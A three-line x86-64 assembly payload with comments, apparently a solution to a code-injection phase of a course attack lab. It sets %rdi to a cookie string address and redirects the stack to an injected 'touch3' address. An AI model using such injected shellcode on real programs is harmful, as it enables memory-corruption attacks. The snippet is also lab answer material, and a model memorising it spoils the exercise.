movq $0x55669A10, %rdi # move address of the cookie string representation to first argument register
movq $0x55669A00, %rsp # move the address of the injected touch3 address to stack pointer register
retq # return
